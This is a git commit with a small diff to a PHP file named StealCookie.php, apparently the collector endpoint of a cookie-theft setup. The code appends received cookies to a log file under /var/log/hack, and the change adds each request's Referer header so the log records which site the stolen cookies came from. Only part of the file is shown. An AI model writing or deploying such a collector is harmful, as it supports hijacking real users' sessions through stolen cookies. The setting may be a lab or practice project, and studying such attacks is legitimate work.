7fe6184365852540768a7c9b3ab0c0d9b9d592a4
AlanD <riemannzetazero@gmail.com>
2020-01-11 01:51:45 +0000

    Added Referer to cookie information

--- html/cookies/StealCookie.php
+++ html/cookies/StealCookie.php
@@ -13,7 +13,7 @@
 		//$file = fopen((date("Y.md.hi.s.")).'/var/log/hack/cookies.txt', 'w');
 		// Append to file
 		$file = fopen('/var/log/hack/cookies.txt', 'a');
-		fwrite($file, (date("Y.md h:i:s "))."===================================\n");
+		fwrite($file, (date("Y.md h:i:s "))." Referer:".($_SERVER['HTTP_REFERER'])." ===================================\n");
 		fwrite($file, $cookies . "\n\n");
 	?>
 </body>
